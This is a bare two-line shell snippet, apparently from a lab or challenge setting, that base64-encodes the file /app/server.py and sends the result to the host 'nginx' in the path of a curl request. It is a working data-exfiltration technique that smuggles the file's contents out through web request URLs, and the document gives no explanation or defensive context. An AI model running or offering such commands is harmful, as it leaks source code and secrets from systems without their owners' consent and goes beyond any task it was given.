a=$(cat /app/server.py | base64 -w 0)
curl http://nginx/$a